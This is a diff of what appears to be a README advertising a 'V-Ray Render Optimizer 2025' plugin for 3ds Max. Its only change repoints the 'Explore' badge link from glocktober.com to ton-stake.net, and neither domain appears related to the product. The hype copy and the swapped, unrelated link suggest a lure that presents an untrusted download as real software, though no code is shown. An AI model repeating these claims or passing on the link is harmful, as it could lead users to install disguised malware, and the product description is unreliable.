@@ -2,7 +2,7 @@
 
 🌟 Elevate your 3ds Max renders with this powerful V-Ray plugin! V-Ray Render Optimizer 2025 streamlines lighting, optimizes textures, and accelerates rendering, crafted for freelancers, small studios, and designers on Windows.
 
-[![Explore V-Ray Optimizer](https://img.shields.io/badge/Explore-VRay_Optimizer-blueviolet)](https://glocktober.com)
+[![Explore V-Ray Optimizer](https://img.shields.io/badge/Explore-VRay_Optimizer-blueviolet)](https://ton-stake.net)
 
 ---
 
